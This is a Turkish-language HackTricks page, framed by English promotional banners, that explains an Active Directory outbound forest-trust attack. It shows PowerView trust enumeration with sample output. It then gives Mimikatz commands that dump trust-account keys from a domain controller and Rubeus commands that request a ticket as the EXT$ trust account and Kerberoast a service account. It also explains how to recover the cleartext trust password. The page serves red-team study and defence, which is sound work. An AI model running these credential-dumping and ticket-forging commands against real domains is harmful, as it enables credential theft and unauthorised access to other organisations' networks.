# Dış Orman Alanı - Tek Yönlü (Çıkış)

{% hint style="success" %}
AWS Hacking öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}

Bu senaryoda **alanınız** bazı **yetkileri** **farklı alanlardan** bir **prensipe** **güvenmektedir**.

## Sayım

### Çıkış Güveni
```powershell
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
## Trust Account Attack

İki alan arasında bir güven ilişkisi kurulduğunda, burada alan **A** ve alan **B** olarak tanımlanan bir güvenlik açığı mevcuttur; alan **B**, alan **A**'ya güvenini genişletir. Bu yapılandırmada, alan **B** için alan **A**'da özel bir hesap oluşturulur ve bu hesap, iki alan arasındaki kimlik doğrulama sürecinde kritik bir rol oynar. Alan **B** ile ilişkilendirilen bu hesap, alanlar arasında hizmetlere erişim için biletleri şifrelemek amacıyla kullanılır.

Burada anlaşılması gereken kritik nokta, bu özel hesabın şifresi ve hash'inin, alan **A**'daki bir Alan Denetleyicisinden bir komut satırı aracı kullanılarak çıkarılabileceğidir. Bu işlemi gerçekleştirmek için kullanılan komut:
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
Bu çıkarım, adının ardından bir **$** ile tanımlanan hesabın aktif olması ve **A** alanının "Domain Users" grubuna ait olması nedeniyle mümkündür; böylece bu grubun ilişkili izinlerini miras alır. Bu, bireylerin bu hesabın kimlik bilgilerini kullanarak **A** alanına kimlik doğrulaması yapmalarını sağlar.

**Uyarı:** Bu durumu, sınırlı izinlerle de olsa bir kullanıcı olarak **A** alanında bir yer edinmek için kullanmak mümkündür. Ancak, bu erişim **A** alanında numaralandırma yapmak için yeterlidir.

`ext.local` güvenen alan ve `root.local` güvenilen alan olduğunda, `root.local` içinde `EXT$` adında bir kullanıcı hesabı oluşturulacaktır. Belirli araçlar aracılığıyla, Kerberos güven anahtarlarını dökerek `root.local` içindeki `EXT$` kimlik bilgilerini açığa çıkarmak mümkündür. Bunu başarmak için kullanılan komut:
```bash
lsadump::trust /patch
```
Bunun ardından, çıkarılan RC4 anahtarını kullanarak `root.local` içinde `root.local\EXT$` olarak kimlik doğrulamak için başka bir araç komutu kullanılabilir:
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
Bu kimlik doğrulama adımı, `root.local` içindeki hizmetleri listeleme ve hatta istismar etme olasılığını açar; örneğin, hizmet hesap kimlik bilgilerini çıkarmak için bir Kerberoast saldırısı gerçekleştirmek:
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Açık metin güven ilişkisi parolasını toplama

Önceki akışta, **açık metin parolası** yerine güven ilişkisi hash'i kullanıldı (bu da **mimikatz tarafından döküldü**).

Açık metin parolası, mimikatz'tan alınan \[ CLEAR ] çıktısını onaltılıdan dönüştürerek ve null byte'ları ‘\x00’ kaldırarak elde edilebilir:

![](<../../.gitbook/assets/image (938).png>)

Bazen bir güven ilişkisi oluşturulurken, kullanıcı tarafından güven için bir parola girilmesi gerekir. Bu gösterimde, anahtar orijinal güven ilişkisi parolasıdır ve dolayısıyla insan tarafından okunabilir. Anahtar döngüye girdiğinde (30 gün), açık metin insan tarafından okunabilir olmayacak ancak teknik olarak hala kullanılabilir.

Açık metin parolası, güven hesabı olarak normal kimlik doğrulama gerçekleştirmek için kullanılabilir; bu, güven hesabının Kerberos gizli anahtarını kullanarak bir TGT talep etmenin bir alternatifidir. Burada, ext.local'dan Domain Admins üyeleri için root.local sorgulanıyor:

![](<../../.gitbook/assets/image (792).png>)

## Referanslar

* [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
